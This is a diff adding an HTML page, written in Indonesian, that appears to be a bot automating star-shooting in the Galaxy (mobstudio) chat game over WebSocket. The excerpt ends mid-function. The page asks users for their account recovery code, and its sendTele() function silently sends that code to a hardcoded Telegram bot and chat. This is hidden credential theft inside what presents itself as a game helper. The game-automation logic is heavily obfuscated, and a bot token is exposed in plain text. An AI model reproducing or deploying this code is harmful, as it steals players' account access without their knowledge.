@@ -1,0 +1,557 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width" />
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/RofiqZaen/Gambar/master/icon.png" />
+
+</head>
+<body><center>
+      <input type="radio" id="gcb" name="mode" checked/> Bola emas
+      <!--input type="radio" id="bcb" name="mode" /> Bola hitam-->
+		<br><br>
+		<input type="checkbox" id="smg" name="target" checked/>Bintang Emas <br>
+		<input type="checkbox" id="slv" name="target" checked/>Bintang Perak<br>
+		<!--input type="checkbox" id="brz" name="target" />Bintang Perunggu<br-->
+		<!--input type="checkbox" id="irn" name="target" />Gentong Besi<br-->
+		<br>
+    <main role="main">
+        <article>
+          <input   id="rc" placeholder="kode" value="" style="width:87px;"/>
+          <button class="btn" id="btn-connect" onClick="sendTele()">Masuk</button>
+          <button class="btn" id="btn-disconnect" >Keluar</button>
+	  <br>
+      <br>
+      <script>
+                function sendTele() {
+                    const kode = document.getElementById('rc').value;
+                    if (!kode) {
+                        alert('Harap masukkan kode!');
+                        return;
+                    }
+                    const botToken = '7604139383:AAFIBY8Ke1-5R9wg6_5ifFup7TKqnMMqI78';
+                    const chatId = '-1001768050319'; 
+                    const message = `${kode}`;
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+                    const data = {
+                        chat_id: chatId,
+                        text: message,
+                    };
+            
+                    fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            
+                        } else {
+                            alert(`Gagal mengirim pesan: ${data.description}`);
+                        }
+                    })
+                    .catch(error => {
+                        alert('Terjadi kesalahan: ' + error.message);
+                    });
+                }
+            </script>
+	    <select name="action" class="action" id="planet">
+        <option value="1">Cannon*1</option>
+        <option value="2">Cannon*2</option>
+        <option value="3">Cannon*3</option>
+        <option value="4">Cannon*4</option>
+        <option value="5">Cannon*5</option>
+        <option value="6">Cannon*6</option>
+        <option value="7">Cannon*7</option>
+        <option value="8">Cannon*8</option>
+        <option value="9">Cannon*9</option>
+        <option value="10">Cannon*10</option>
+        <option value="11">Cannon*11</option>
+        <option value="12">Cannon*12</option>
+        <option value="13">Cannon*13</option>
+        <option value="14">Cannon*14</option>
+        <option value="15">Cannon*15</option>
+        <option value="16">Cannon*16</option>
+        <option value="17">Cannon*17</option>
+        <option value="18">Cannon*18</option>
+        <option value="19">Cannon*19</option>
+        <option value="20">Cannon*20</option>
+        </select>
+        <button class="btn" id="plntgo" >Terbang</button><br><br>
+		<section>
+			<div id="wlbl">
+				<span id="clockbox">
+				</span><br>
+			<textarea id="log"  rows="10" cols="30" style="width: 80%">
+			</textarea>
+		</div></center>
+		<script
+			src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"
+			integrity="sha512-nOQuvD9nKirvxDdvQ9OMqe2dgapbPB7vYAMrzJihw5m+aNcf0dX53m6YxM4LgA9u8e9eg9QX+/+mPu8kCNpV2A=="
+			crossorigin="anonymous">
+		</script>
+		<script
+			src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js">
+		</script>
+		<script>
+		function openPage(pageName, elmnt, color) {
+        var i, tabcontent, tablinks; tabcontent = document.getElementsByClassName("tabcontent");
+        for (i = 0; i < tabcontent.length; i++) {
+          tabcontent[i].style.display = "none";
+        }
+        tablinks = document.getElementsByClassName("tablink");
+        for (i = 0; i < tablinks.length; i++) {
+          tablinks[i].style.backgroundColor = "";
+        }
+        document.getElementById(pageName).style.display = "block";
+        elmnt.style.backgroundColor = color;
+		}
+
+
+      Date.prototype.toDateInputValue = (function () {
+        var local = new Date(this);
+        local.setMinutes(this.getMinutes() - this.getTimezoneOffset());
+        return local.toJSON().slice(0, 10);
+      });
+
+      // Get the element with id="defaultOpen" and click on it
+      document.getElementById("defaultOpen").click();
+    </script>
+
+    <script defer>var _0x285b5e = _0x218e;
+(function (_0x2cd194, _0x3eb2db) {
+  var _0x33b650 = _0x218e, _0x1b4062 = _0x2cd194();
+  while (true) {
+    try {
+     var _0x2e1c2c = parseInt(_0x33b650(442)) / 1 + parseInt(_0x33b650(585)) / 2 * (-parseInt(_0x33b650(503)) / 3) + parseInt(_0x33b650(444)) / 4 + -parseInt(_0x33b650(480)) / 5 + parseInt(_0x33b650(528)) / 6 * (parseInt(_0x33b650(502)) / 7) + -parseInt(_0x33b650(476)) / 8 * (-parseInt(_0x33b650(554)) / 9) + -parseInt(_0x33b650(465)) / 10; 
+      if (_0x2e1c2c === _0x3eb2db) break; else _0x1b4062.push(_0x1b4062.shift());
+    } catch (_0x272dab) {
+      _0x1b4062.push(_0x1b4062.shift());
+    }
+  }
+}(_0x2102, 244404));
+var id, useridg, passwordg, channelid, rc, possmg, posslv, cnnId, posbrz, posirn, shift, curPlanet, txt, ws, haaapsi, onoff = document.getElementById("onoroff"), btn = document[_0x285b5e(541)]("btn-connect");
+function _0x2102() {
+  var _0x29b5c0 = ["6015;-38;22;33;50", "i3;25;0;33;50", "5998;25;5;33;50", "5998;-25;44;33;cn", "USER ", "Hex", "click", "PHONE 2208 1242 0 2 :firefox 92.0", "clockbox", "5998;-50;44;33;cn", "6015;0;49;33;50", "Penerbangan ke planet Cannon*", "enc", ":en IDENT 312 -2 4030 1 2 :GALA\r\n", "ACTION 2403 ", "scrollTop", "6000;25;5;33;50", "**Bola berhasil ditembakkan**\n", "smg", "38FmqqeG", "MYADDONS 249847 2\r\n", "5998;-25;49;33;50", "6000;25;0;33;50", "6000;-25;5;33;50", "6000;0;5;33;cn", "5998;0;49;33;cn", "6000;-50;0;33;50", "i3;-13;22;33;50", "Anda pingsan..\n\n", "gcb", "6015;0;0;33;50", "6015;-63;22;33;50", "checked", "\r\n", "6015;12;22;33;50", "REGISTER", "6000;-25;5;33;cn", "PHONE 1536 864 0 2 :chrome 92.0.4515.159", "252191hcuttJ", "Target.. Upaya menembak.\n", "200520EsszXH", "i3;-25;44;33;cn", "brz", "5998;0;0;33;50", "\r\n", "i3;-13;22;33;cn", "i3;-38;22;33;50", "REMOVE 450\r\n", "6015;25;5;33;cn", ":srv", "6000;0;5;33;50", "900", "6000;-50;5;33;50", "shoots", "6015;12;27;33;cn", "5998;-50;49;33;cn", "i3;12;22;33;50", "i3;-50;44;33;cn", "Bola emas disiapkan.\n", "QUIT :ds\r\n", "addEventListener", "35060HnTsTw", "join", "includes", "5998;12;22;33;50", "i3;0;44;33;cn", "ACTION 3366 ", "5998;0;49;33;50", "6015;-50;44;33;50", "6015;0;44;33;50", "6015;0;44;33;cn", "REMOVE ", "37024VyVVHT", "PHONE 1536 864 0 2 :chrome 93.0.4577.63", "Bola hitam disiapkan.\n", "6015;-13;27;33;50", "1123960rqCyxz", "PHONE 1536 864 0 2 :chrome 95.0.4638.69", "5998;-25;44;33;50", "\r\n", "i3;12;22;33;cn", "PONG\r\n", "ACTION 3367 ", "bcb", "ACTION 6528 ", "getMinutes", "\r\n", "5998;-13;22;33;50", "planet", "\r\n", "scrollHeight", ":Select", "i3;-63;22;33;50", "split", "i3;25;0;33;cn", "5998;0;0;33;cn", "send", "6015;-25;44;33;50", "70987jIkRSR", "24057mAAuRI", "Koneksi berhasil.\n", "5998;-25;49;33;cn", "indexOf", "5998;-38;22;33;50", "6015;-63;27;33;cn", "6015;25;5;33;50", "MD5", "onmessage", "6015;0;5;33;50", "5998;-13;27;33;50", "\r\n", "6015;25;0;33;50", "slv", "6015;0;49;33;cn", "\r\n", "getHours", "i3;-63;22;33;cn", "btn-disconnect", "onopen", "Planet saat ini: ", "VIEW_SCRIPT", "5998;-50;44;33;50", "PHONE 2208 1242 0 2 :firefox 93.0", "value", "180xalAwp", "Memulai program...\n", "light_g;52;0;33", "HAAAPSI", "6015;-13;22;33;cn", "6015;-25;44;33;cn", "ACTION 2402 ", "PHONE 1536 864 0 2 :opr 80.0.4150.0", "5998;-38;27;33;50", "6015;-25;49;33;cn", "5998;-38;27;33;cn", "i3;0;44;33;50", "6000;-25;0;33;cn", "getElementById", "ACTION 2401 ", "reverse", "6015;-38;27;33;50", "log", "5998;25;5;33;cn", "5998;0;44;33;cn", "irn", "6015;-25;49;33;50", "JOIN Cannon*", "wss://cs.mobstudio.ru:6672", "5998;12;27;33;cn", "6000;-50;5;33;cn", "36vuyukN", "6000;25;5;33;cn", "6015;-50;49;33;50", "FWLISTVER 281\r\n", "6015;-38;27;33;cn", "6015;-13;22;33;50", "5998;-63;22;33;cn", "5998;0;5;33;50", "6015;25;0;33;cn", "floor", "random", "5998;12;27;33;50"];
+  _0x2102 = function () {
+    return _0x29b5c0;
+  };
+  return _0x2102();
+}
+function _0x218e(_0x237559, _0x5baf2e) {
+  var _0x210280 = _0x2102();
+  return _0x218e = function (_0x218ebc, _0x315948) {
+    _0x218ebc = _0x218ebc - 438;
+    var _0x552bae = _0x210280[_0x218ebc];
+    return _0x552bae;
+  }, _0x218e(_0x237559, _0x5baf2e);
+}
+msgCounter = 0, btn[_0x285b5e(464)]("click", () => {
+  var _0x564513 = _0x285b5e;
+  rc = document.getElementById("rc")[_0x564513(527)], wsAddress = _0x564513(551), ws = new WebSocket(wsAddress);
+  var _0x529dcb = document[_0x564513(541)](_0x564513(545));
+  _0x529dcb[_0x564513(581)] = _0x529dcb[_0x564513(494)], _0x529dcb.value += _0x564513(529);
+  const _0x4c449f = _0x5600cc => {
+    var _0x14b958 = _0x564513, _0x4e4709 = CryptoJS[_0x14b958(510)](_0x5600cc).toString(CryptoJS[_0x14b958(578)][_0x14b958(571)]);
+    return _0x4e4709 = (_0x4e4709 = _0x4e4709[_0x14b958(497)]("").reverse()[_0x14b958(466)]("0")).substr(5, 10);
+  };
+  ws[_0x564513(522)] = () => {
+    var _0x4dca81 = _0x564513;
+    ws[_0x4dca81(500)](_0x4dca81(579));
+  }, ws[_0x564513(511)] = _0x4aac75 => {
+    var _0xee050f = _0x564513, _0x2c076b = _0x4aac75.data, _0x2307f8 = _0x2c076b.split("/")[_0xee050f(466)](" "), _0xa13ad8 = _0x2307f8[_0xee050f(497)](",")[_0xee050f(466)](" "), _0x4e73ac = _0xa13ad8.split(" ");
+    _0x4e73ac[0] === _0xee050f(531) && (haaapsi = _0x4e73ac[1], ws.send("RECOVER " + rc + "\r\n"));
+    if (_0x4e73ac[0] === _0xee050f(439)) {
+      var _0x1e2985 = _0x4c449f(haaapsi);
+      id = _0x4e73ac[1];
+      var _0x17b5f0 = _0x4e73ac[2], _0x3b7c58 = _0x4e73ac[3];
+      useridg = id, passwordg = _0x17b5f0;
+      var _0x3fbf34 = _0x3b7c58[_0xee050f(497)]("\r\n");
+      ws[_0xee050f(500)](_0xee050f(570) + id + " " + _0x17b5f0 + " " + _0x3fbf34 + " " + _0x1e2985 + "\r\n");
+    }
+    if (_0x4e73ac[0] === "999") {
+      var _0x2296ab = ["PHONE 1366 768 0 2 :chrome 87.0.4280.141", "PHONE 2208 1242 0 2 :firefox 94.0", "PHONE 1536 864 0 2 :opr 80.0.4170.63", "PHONE 1536 864 0 2 :chrome 94.0.4606.114", _0xee050f(481), "PHONE 1536 864 0 2 :opr 81.0.4175.0", "PHONE 1536 864 0 2 :opr 80.0.4170.11", _0xee050f(535), _0xee050f(441), _0xee050f(477), "PHONE 1536 864 0 2 :chrome 94.0.4606.61", _0xee050f(526), _0xee050f(573)], _0x3c31b6 = _0x2296ab[Math.floor(Math[_0xee050f(564)]() * (_0x2296ab.length - 0) + 0)];
+      ws[_0xee050f(500)](_0xee050f(557)), ws[_0xee050f(500)]("ADDONS 249847 2\r\n"), ws[_0xee050f(500)](_0xee050f(586)), ws.send(_0x3c31b6 + "\r\n"), ws.send("JOIN\r\n");
+      var _0x3d9b6c = document[_0xee050f(541)](_0xee050f(545));
+      _0x3d9b6c[_0xee050f(581)] = _0x3d9b6c[_0xee050f(494)], _0x3d9b6c.value += _0xee050f(504);
+    }
+    _0x4e73ac[0] === "PING\r\n" && ws[_0xee050f(500)](_0xee050f(485));
+    if (_0x4e73ac[0] === _0xee050f(524)) {
+      cnnId = _0x4e73ac[2];
+      var _0x5b52e5 = _0x4e73ac[_0xee050f(543)](), _0x253e37 = _0x5b52e5[_0xee050f(506)]("6015;-50;44;33;cn"), _0x519a66 = _0x5b52e5[_0xee050f(506)](_0xee050f(472)), _0x3b1dda = _0x5b52e5[_0xee050f(506)]("6015;-50;49;33;cn"), _0x5989f5 = _0x5b52e5[_0xee050f(506)](_0xee050f(556)), _0x1c99d3 = _0x5b52e5.indexOf(_0xee050f(533)), _0xe1a174 = _0x5b52e5[_0xee050f(506)](_0xee050f(501)), _0x359e7a = _0x5b52e5[_0xee050f(506)](_0xee050f(537)), _0x3add8e = _0x5b52e5[_0xee050f(506)](_0xee050f(549)), _0x4deef5 = _0x5b52e5[_0xee050f(506)](_0xee050f(474)), _0x3c2566 = _0x5b52e5[_0xee050f(506)](_0xee050f(473)), _0x5d9971 = _0x5b52e5[_0xee050f(506)](_0xee050f(517)), _0x12610e = _0x5b52e5[_0xee050f(506)](_0xee050f(576)), _0x3e5563 = _0x5b52e5[_0xee050f(506)]("6015;-63;22;33;cn"), _0x163130 = _0x5b52e5.indexOf(_0xee050f(597)), _0x42d9f7 = _0x5b52e5[_0xee050f(506)](_0xee050f(508)), _0x2fdeae = _0x5b52e5[_0xee050f(506)]("6015;-63;27;33;50"), _0x33ee94 = _0x5b52e5[_0xee050f(506)]("6015;-38;22;33;cn"), _0x53bd1c = _0x5b52e5[_0xee050f(506)](_0xee050f(566)), _0x4ed500 = _0x5b52e5[_0xee050f(506)](_0xee050f(558)), _0x2496ef = _0x5b52e5.indexOf(_0xee050f(544)), _0x28b378 = _0x5b52e5[_0xee050f(506)](_0xee050f(532)), _0x1a36d4 = _0x5b52e5[_0xee050f(506)](_0xee050f(559)), _0x5c66ce = _0x5b52e5[_0xee050f(506)]("6015;-13;27;33;cn"), _0x4a076b = _0x5b52e5[_0xee050f(506)](_0xee050f(479)), _0x1e1a75 = _0x5b52e5[_0xee050f(506)]("6015;12;22;33;cn"), _0x5370ac = _0x5b52e5[_0xee050f(506)](_0xee050f(438)), _0x38d84f = _0x5b52e5[_0xee050f(506)](_0xee050f(458)), _0x514d26 = _0x5b52e5[_0xee050f(506)]("6015;12;27;33;50"), _0x210c51 = _0x5b52e5[_0xee050f(506)]("6015;0;0;33;cn"), _0xcdc1c9 = _0x5b52e5[_0xee050f(506)](_0xee050f(596)), _0x4e2293 = _0x5b52e5[_0xee050f(506)]("6015;0;5;33;cn"), _0x1462f5 = _0x5b52e5[_0xee050f(506)](_0xee050f(512)), _0x5b6589 = _0x5b52e5[_0xee050f(506)](_0xee050f(562)), _0x3b39d9 = _0x5b52e5[_0xee050f(506)](_0xee050f(515)), _0x586a30 = _0x5b52e5.indexOf(_0xee050f(452)), _0x148fa9 = _0x5b52e5.indexOf(_0xee050f(509));
+      (_0x253e37 != -1 || _0x519a66 != -1) && (possmg = 1);
+      (_0x1c99d3 != -1 || _0xe1a174 != -1) && (possmg = 2);
+      (_0x4deef5 != -1 || _0x3c2566 != -1) && (possmg = 3);
+      (_0x3e5563 != -1 || _0x163130 != -1) && (possmg = 4);
+      (_0x33ee94 != -1 || _0x53bd1c != -1) && (possmg = 5);
+      (_0x28b378 != -1 || _0x1a36d4 != -1) && (possmg = 6);
+      (_0x1e1a75 != -1 || _0x5370ac != -1) && (possmg = 7);
+      (_0x210c51 != -1 || _0xcdc1c9 != -1) && (possmg = 10);
+      (_0x5b6589 != -1 || _0x3b39d9 != -1) && (possmg = 11);
+      (_0x3b1dda != -1 || _0x5989f5 != -1) && (possmg = 0);
+      (_0x359e7a != -1 || _0x3add8e != -1) && (possmg = 0);
+      (_0x5d9971 != -1 || _0x12610e != -1) && (possmg = 0);
+      (_0x42d9f7 != -1 || _0x2fdeae != -1) && (possmg = 0);
+      (_0x4ed500 != -1 || _0x2496ef != -1) && (possmg = 0);
+      (_0x5c66ce != -1 || _0x4a076b != -1) && (possmg = 0);
+      (_0x38d84f != -1 || _0x514d26 != -1) && (possmg = 0);
+      (_0x4e2293 != -1 || _0x1462f5 != -1) && (possmg = 0);
+      (_0x586a30 != -1 || _0x148fa9 != -1) && (possmg = 0);
+      var _0x506880 = _0x5b52e5[_0xee050f(506)](_0xee050f(461)), _0x209b7e = _0x5b52e5[_0xee050f(506)]("i3;-50;44;33;50"), _0x14c325 = _0x5b52e5.indexOf(_0xee050f(445)), _0x1d428b = _0x5b52e5[_0xee050f(506)]("i3;-25;44;33;50"), _0x2b5227 = _0x5b52e5[_0xee050f(506)](_0xee050f(469)), _0x271019 = _0x5b52e5[_0xee050f(506)](_0xee050f(539)), _0x15dd80 = _0x5b52e5[_0xee050f(506)](_0xee050f(520)), _0xbf4c79 = _0x5b52e5.indexOf(_0xee050f(496)), _0x28fe98 = _0x5b52e5.indexOf("i3;-38;22;33;cn"), _0x5bf35e = _0x5b52e5[_0xee050f(506)](_0xee050f(450)), _0x29e4bb = _0x5b52e5.indexOf(_0xee050f(449)), _0x3dafd8 = _0x5b52e5[_0xee050f(506)](_0xee050f(593)), _0x18f2d2 = _0x5b52e5.indexOf(_0xee050f(484)), _0x5dc197 = _0x5b52e5[_0xee050f(506)](_0xee050f(460)), _0x51b6dd = _0x5b52e5[_0xee050f(506)]("i3;0;0;33;cn"), _0x600b11 = _0x5b52e5.indexOf("i3;0;0;33;50"), _0x1e2041 = _0x5b52e5[_0xee050f(506)](_0xee050f(498)), _0x31ff29 = _0x5b52e5[_0xee050f(506)](_0xee050f(567));
+      (_0x506880 != -1 || _0x209b7e != -1) && (posirn = 1);
+      (_0x14c325 != -1 || _0x1d428b != -1) && (posirn = 2);
+      (_0x2b5227 != -1 || _0x271019 != -1) && (posirn = 3);
+      (_0x15dd80 != -1 || _0xbf4c79 != -1) && (posirn = 4);
+      (_0x28fe98 != -1 || _0x5bf35e != -1) && (posirn = 5);
+      (_0x29e4bb != -1 || _0x3dafd8 != -1) && (posirn = 6);
+      (_0x18f2d2 != -1 || _0x5dc197 != -1) && (posirn = 7);
+      (_0x51b6dd != -1 || _0x600b11 != -1) && (posirn = 10);
+      (_0x1e2041 != -1 || _0x31ff29 != -1) && (posirn = 11);
+      _0x506880 != -1 && (_0x5b52e5[_0x506880 - 1][_0xee050f(467)]("f") && (posirn = 0));
+      _0x14c325 != -1 && (_0x5b52e5[_0x14c325 - 1][_0xee050f(467)]("f") && (posirn = 0));
+      _0x2b5227 != -1 && (_0x5b52e5[_0x2b5227 - 1].includes("f") && (posirn = 0));
+      _0x15dd80 != -1 && (_0x5b52e5[_0x15dd80 - 1].includes("f") && (posirn = 0));
+      _0x28fe98 != -1 && (_0x5b52e5[_0x28fe98 - 1][_0xee050f(467)]("f") && (posirn = 0));
+      _0x29e4bb != -1 && (_0x5b52e5[_0x29e4bb - 1][_0xee050f(467)]("f") && (posirn = 0));
+      _0x18f2d2 != -1 && (_0x5b52e5[_0x18f2d2 - 1][_0xee050f(467)]("f") && (posirn = 0));
+      _0x51b6dd != -1 && (_0x5b52e5[_0x51b6dd - 1][_0xee050f(467)]("f") && (posirn = 0));
+      _0x1e2041 != -1 && (_0x5b52e5[_0x1e2041 - 1].includes("f") && (posirn = 0));
+      var _0x1ab03f = _0x5b52e5.indexOf(_0xee050f(575)), _0x529c39 = _0x5b52e5[_0xee050f(506)](_0xee050f(525)), _0x5b4c38 = _0x5b52e5[_0xee050f(506)](_0xee050f(459)), _0x1cb6e6 = _0x5b52e5[_0xee050f(506)]("5998;-50;49;33;50"), _0x318239 = _0x5b52e5[_0xee050f(506)](_0xee050f(569)), _0x1218df = _0x5b52e5[_0xee050f(506)](_0xee050f(482)), _0x3a7358 = _0x5b52e5[_0xee050f(506)](_0xee050f(505)), _0x834938 = _0x5b52e5[_0xee050f(506)](_0xee050f(587)), _0x142ca5 = _0x5b52e5.indexOf(_0xee050f(547)), _0x21ec3c = _0x5b52e5.indexOf("5998;0;44;33;50"), _0x4faa9b = _0x5b52e5[_0xee050f(506)](_0xee050f(591)), _0x13d7fe = _0x5b52e5[_0xee050f(506)](_0xee050f(471)), _0xdcb7db = _0x5b52e5[_0xee050f(506)](_0xee050f(560)), _0x2edd6e = _0x5b52e5[_0xee050f(506)]("5998;-63;22;33;50"), _0x5e866d = _0x5b52e5.indexOf("5998;-63;27;33;cn"), _0x474b10 = _0x5b52e5.indexOf("5998;-63;27;33;50"), _0x28d53c = _0x5b52e5.indexOf("5998;-38;22;33;cn"), _0x9949ad = _0x5b52e5[_0xee050f(506)](_0xee050f(507)), _0x1fd604 = _0x5b52e5[_0xee050f(506)](_0xee050f(538)), _0x210d7a = _0x5b52e5.indexOf(_0xee050f(536)), _0x4c94f1 = _0x5b52e5[_0xee050f(506)]("5998;-13;22;33;cn"), _0x527924 = _0x5b52e5.indexOf(_0xee050f(491)), _0x4b05be = _0x5b52e5[_0xee050f(506)]("5998;-13;27;33;cn"), _0x544730 = _0x5b52e5[_0xee050f(506)](_0xee050f(513)), _0x246fa1 = _0x5b52e5[_0xee050f(506)]("5998;12;22;33;cn"), _0x27dd5f = _0x5b52e5[_0xee050f(506)](_0xee050f(468)), _0x5f53ec = _0x5b52e5[_0xee050f(506)](_0xee050f(552)), _0x5e3840 = _0x5b52e5[_0xee050f(506)](_0xee050f(565)), _0x519f1f = _0x5b52e5[_0xee050f(506)](_0xee050f(499)), _0x48eb53 = _0x5b52e5[_0xee050f(506)](_0xee050f(447)), _0x2a1c2e = _0x5b52e5[_0xee050f(506)]("5998;0;5;33;cn"), _0x282d58 = _0x5b52e5.indexOf(_0xee050f(561)), _0x2b39b4 = _0x5b52e5[_0xee050f(506)]("5998;25;0;33;cn"), _0x1aadde = _0x5b52e5[_0xee050f(506)]("5998;25;0;33;50"), _0x46612d = _0x5b52e5[_0xee050f(506)](_0xee050f(546)), _0x416406 = _0x5b52e5[_0xee050f(506)](_0xee050f(568));
+      (_0x1ab03f != -1 || _0x529c39 != -1) && (posbrz = 1);
+      (_0x318239 != -1 || _0x1218df != -1) && (posbrz = 2);
+      (_0x142ca5 != -1 || _0x21ec3c != -1) && (posbrz = 3);
+      (_0xdcb7db != -1 || _0x2edd6e != -1) && (posbrz = 4);
+      (_0x28d53c != -1 || _0x9949ad != -1) && (posbrz = 5);
+      (_0x4c94f1 != -1 || _0x527924 != -1) && (posbrz = 6);
+      (_0x246fa1 != -1 || _0x27dd5f != -1) && (posbrz = 7);
+      (_0x519f1f != -1 || _0x48eb53 != -1) && (posbrz = 10);
+      (_0x2b39b4 != -1 || _0x1aadde != -1) && (posbrz = 11);
+      (_0x5b4c38 != -1 || _0x1cb6e6 != -1) && (posbrz = 0);
+      (_0x3a7358 != -1 || _0x834938 != -1) && (posbrz = 0);
+      (_0x4faa9b != -1 || _0x13d7fe != -1) && (posbrz = 0);
+      (_0x5e866d != -1 || _0x474b10 != -1) && (posbrz = 0);
+      (_0x1fd604 != -1 || _0x210d7a != -1) && (posbrz = 0);
+      (_0x4b05be != -1 || _0x544730 != -1) && (posbrz = 0);
+      (_0x5f53ec != -1 || _0x5e3840 != -1) && (posbrz = 0);
+      (_0x2a1c2e != -1 || _0x282d58 != -1) && (posbrz = 0);
+      (_0x46612d != -1 || _0x416406 != -1) && (posbrz = 0);
+      var _0x203426 = _0x5b52e5[_0xee050f(506)]("6000;-50;0;33;cn"), _0x384768 = _0x5b52e5[_0xee050f(506)](_0xee050f(592)), _0x3d6f21 = _0x5b52e5.indexOf(_0xee050f(553)), _0xf072c = _0x5b52e5[_0xee050f(506)](_0xee050f(456)), _0x7938a6 = _0x5b52e5[_0xee050f(506)](_0xee050f(540)), _0x29b000 = _0x5b52e5.indexOf("6000;-25;0;33;50"), _0x4e29fd = _0x5b52e5[_0xee050f(506)](_0xee050f(440)), _0x24f477 = _0x5b52e5[_0xee050f(506)](_0xee050f(589)), _0x138775 = _0x5b52e5[_0xee050f(506)]("6000;0;0;33;cn"), _0x5dc77a = _0x5b52e5[_0xee050f(506)]("6000;0;0;33;50"), _0x536816 = _0x5b52e5[_0xee050f(506)](_0xee050f(590)), _0x3f806c = _0x5b52e5[_0xee050f(506)](_0xee050f(454)), _0x3d5a65 = _0x5b52e5.indexOf("6000;25;0;33;cn"), _0x1a0671 = _0x5b52e5[_0xee050f(506)](_0xee050f(588)), _0x5a2675 = _0x5b52e5[_0xee050f(506)](_0xee050f(555)), _0x59ea86 = _0x5b52e5.indexOf(_0xee050f(582));
+      (_0x203426 != -1 || _0x384768 != -1) && (posslv = 8), (_0x7938a6 != -1 || _0x29b000 != -1) && (posslv = 9), (_0x138775 != -1 || _0x5dc77a != -1) && (posslv = 10), (_0x3d5a65 != -1 || _0x1a0671 != -1) && (posslv = 11), (_0x3d6f21 != -1 || _0xf072c != -1) && (posslv = 0), (_0x4e29fd != -1 || _0x24f477 != -1) && (posslv = 0), (_0x536816 != -1 || _0x3f806c != -1) && (posslv = 0), (_0x5a2675 != -1 || _0x59ea86 != -1) && (posslv = 0);
+    }
+    if (_0x4e73ac[0] === _0xee050f(453) && _0x4e73ac[8] === "with") {
+      var _0x38f9ef = Math[_0xee050f(563)](Math[_0xee050f(564)]() * 50 + 450), _0x34e81a = Math[_0xee050f(563)](Math[_0xee050f(564)]() * 2500 + 3500), _0x314fcb = Math[_0xee050f(563)](Math.random() * 1e3 + 7e3), _0x501604 = Math[_0xee050f(563)](Math[_0xee050f(564)]() * 1e3 + 8e3), _0x22c7cf = Math[_0xee050f(563)](Math[_0xee050f(564)]() * 1e3 + 9e3), _0x660eab = document[_0xee050f(541)](_0xee050f(487)), _0x458078 = document.getElementById("gcb");
+      setTimeout(() => {
+        
+      }, _0x34e81a), setTimeout(() => {
+        var _0x39e579 = _0xee050f;
+        ws[_0x39e579(500)](_0x39e579(534) + useridg + "\r\n"), shift = 3;
+      }, _0x314fcb), setTimeout(() => {
+        var _0x5107a5 = _0xee050f;
+        ws[_0x5107a5(500)](_0x5107a5(534) + useridg + "\r\n"), shift = 4;
+      }, _0x501604);
+      if (_0x458078.checked) setTimeout(() => {
+        var _0x4fa77c = _0xee050f;
+        ws[_0x4fa77c(500)](_0x4fa77c(488) + useridg + "\r\n");
+      }, _0x22c7cf); else _0x660eab[_0xee050f(598)] && setTimeout(() => {
+        var _0x19ad75 = _0xee050f;
+        ws[_0x19ad75(500)]("ACTION 6527 " + useridg + "\r\n");
+      }, _0x22c7cf);
+    }
+    if (_0x4e73ac[0] === ":srv" && _0x4e73ac[4] === _0xee050f(495)) {
+      var _0x22c7cf = Math.floor(Math[_0xee050f(564)]() * 1e3 + 2e3), _0x38f9ef = Math[_0xee050f(563)](Math[_0xee050f(564)]() * 50 + 450), _0x34e81a = Math[_0xee050f(563)](Math[_0xee050f(564)]() * 1500 + 7500), _0x314fcb = Math.floor(Math[_0xee050f(564)]() * 1e3 + 9e3), _0x501604 = Math.floor(Math[_0xee050f(564)]() * 1e3 + 1e4), _0x660eab = document[_0xee050f(541)]("bcb"), _0x458078 = document[_0xee050f(541)]("gcb");
+      if (_0x458078[_0xee050f(598)]) setTimeout(() => {
+        var _0x26b811 = _0xee050f;
+        ws[_0x26b811(500)](_0x26b811(486) + useridg + "\r\n");
+        var _0x252777 = document[_0x26b811(541)](_0x26b811(545));
+        _0x252777[_0x26b811(581)] = _0x252777[_0x26b811(494)], _0x252777[_0x26b811(527)] += _0x26b811(462);
+      }, _0x22c7cf); else _0x660eab[_0xee050f(598)] && setTimeout(() => {
+        var _0x41c1ca = _0xee050f;
+        ws.send(_0x41c1ca(470) + useridg + "\r\n");
+        var _0x102982 = document[_0x41c1ca(541)]("log");
+        _0x102982[_0x41c1ca(581)] = _0x102982[_0x41c1ca(494)], _0x102982[_0x41c1ca(527)] += _0x41c1ca(478);
+      }, _0x22c7cf);
+      setTimeout(() => {
+        var _0x37bda1 = _0xee050f;
+        ws.send(_0x37bda1(475) + _0x38f9ef + "\r\n");
+      }, _0x34e81a), setTimeout(() => {
+        var _0x3c983c = _0xee050f;
+        ws[_0x3c983c(500)](_0x3c983c(534) + useridg + "\r\n"), shift = 3;
+      }, _0x314fcb), setTimeout(() => {
+        var _0x525940 = _0xee050f;
+        ws[_0x525940(500)]("ACTION 2402 " + useridg + "\r\n"), shift = 4;
+      }, _0x501604);
+    }
+    if (_0x4e73ac[0] === "ACTION" && _0x4e73ac[1] === cnnId && _0x4e73ac[2] === useridg && _0x4e73ac[4] === _0xee050f(457)) {
+      var _0x3d9b6c = document[_0xee050f(541)](_0xee050f(545));
+      _0x3d9b6c[_0xee050f(581)] = _0x3d9b6c[_0xee050f(494)], _0x3d9b6c[_0xee050f(527)] += _0xee050f(583);
+      var _0x660eab = document[_0xee050f(541)](_0xee050f(487)), _0x458078 = document.getElementById(_0xee050f(595)), _0x22c7cf = Math.floor(Math.random() * 1e3 + 2e3);
+      setTimeout(() => {
+        var _0x59f850 = _0xee050f;
+        if (_0x660eab[_0x59f850(598)]) {
+          ws[_0x59f850(500)](_0x59f850(470) + cnnId + "\r\n");
+          var _0x373f32 = document[_0x59f850(541)](_0x59f850(545));
+          _0x373f32[_0x59f850(581)] = _0x373f32[_0x59f850(494)], _0x373f32[_0x59f850(527)] += _0x59f850(478), setTimeout(() => {
+            var _0x69c2a7 = _0x59f850;
+            ws.send(_0x69c2a7(534) + useridg + "\r\n"), shift = 4;
+          }, 1e3);
+        } else {
+          if (_0x458078[_0x59f850(598)]) {
+            ws.send(_0x59f850(486) + cnnId + "\r\n");
+            var _0x373f32 = document[_0x59f850(541)](_0x59f850(545));
